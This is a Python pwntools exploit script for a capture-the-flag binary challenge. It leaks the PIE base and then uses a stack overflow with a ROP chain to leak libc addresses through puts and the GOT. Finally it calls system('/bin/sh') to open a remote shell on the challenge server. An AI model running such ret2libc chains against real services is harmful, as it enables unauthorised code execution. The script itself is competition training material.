#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'challenges.ctf.compfest.id', 20008

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec chall 
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      PIE enabled

def exploit():
    global io
    io = initialize()

    io.sendlineafter(b'>', b'2')
    io.recvuntil(b'isinya: 0x')
    elf.address = int(io.recvline().strip(), 16) - elf.sym['main']

    POP_RDI = elf.address + 0x1513
    RET = elf.address + 0x101a

    payload = flat({
        64+8: [
            POP_RDI,
            elf.got['puts'],
            elf.plt['puts'],
            elf.sym['main']
        ]
    })
    io.sendlineafter(b'>', b'1')
    io.sendline(payload)
    io.sendlineafter(b'>', b'3')

    io.recvuntil(b'hush\n')
    puts = u64(io.recv(6).ljust(8, b'\x00'))

    payload = flat({
        64+8: [
            POP_RDI,
            elf.got['printf'],
            elf.plt['puts'],
            elf.sym['main']
        ]
    })
    io.sendlineafter(b'>', b'1')
    io.sendline(payload)
    io.sendlineafter(b'>', b'3')

    io.recvuntil(b'hush\n')
    printf = u64(io.recv(6).ljust(8, b'\x00'))

    payload = flat({
        64+8: [
            POP_RDI,
            elf.got['printf'],
            elf.plt['puts'],
            elf.sym['main']
        ]
    })
    io.sendlineafter(b'>', b'1')
    io.sendline(payload)
    io.sendlineafter(b'>', b'3')

    io.recvuntil(b'hush\n')
    printf = u64(io.recv(6).ljust(8, b'\x00'))

    libc_base = printf - 0x61c90
    binsh = libc_base + 0x1b45bd
    system = libc_base + 0x52290

    payload = flat({
        64+8: [
            POP_RDI,
            binsh,
            RET,
            system,
        ]
    })
    io.sendlineafter(b'>', b'1')
    io.sendline(payload)
    io.sendlineafter(b'>', b'3')


    log.success('elf base: %#x', elf.address)
    log.success('puts: %#x', puts)
    log.success('printf: %#x', printf)
    log.success('libc base: %#x', libc_base)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
